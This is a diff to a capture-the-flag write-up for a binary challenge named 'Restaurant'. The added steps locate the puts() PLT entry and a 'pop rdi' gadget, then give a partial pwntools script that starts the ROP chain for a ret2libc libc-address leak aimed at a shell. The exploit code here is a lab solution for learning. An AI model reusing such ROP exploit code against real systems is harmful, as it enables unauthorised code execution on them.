@@ -52,6 +52,58 @@ Welcome to our Restaurant. Here, you can eat and drink as much as you want! Just
 11. Find the correct libc library used (in this case we don't need to, because we the library is given).
 12. Calculate & set the ASLR base address of libc library used in the server.
 13. ROP payload for system call bash.
+14. So first, we need to grep our `puts()` address from the plt and the **pop rdi** gadget, we can simply find the `puts()` address using gdb and the **pop rdi** offset using `ropper`.
+
+> USING GDB - 0x400650
+
+![image](https://user-images.githubusercontent.com/70703371/218255402-0b113e76-3672-4cca-98ab-6f03d6cca88c.png)
+
+
+> USING ROPPER (To get pop rdi) - 0x4010a3
+
+![image](https://user-images.githubusercontent.com/70703371/218255428-7e10147a-25fe-49d6-b6cc-1163373e6db9.png)
+
+
+15. Anyway we can simplify that using **pwntools**, by executing this one line of script:
+
+```py
+rop.call(elf.plt['puts'], [next(elf.search(b''))])
+```
+
+> IMPLEMENT IT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: 
+        return process([exe] + argv, *a, **kw)
+
+exe = './restaurant'
+libc_library = './libc.so.6'
+elf = context.binary = ELF(exe, checksec=False)
+libc = context.binary = ELF(libc_library, checksec=False)
+context.log_level = 'debug'
+
+sh = start()
+
+offsetRsp = b'A' * 40
+rop = ROP(elf) 
+
+rop.call(elf.plt['puts'], [next(elf.search(b''))]) 
+```
+
+> OUTPUT - Got all of it correctly
+
+![image](https://user-images.githubusercontent.com/70703371/218255496-cc815fca-1a32-463d-b481-de00220cb73a.png)
+
+
+
 
 > THE SCRIPT
 
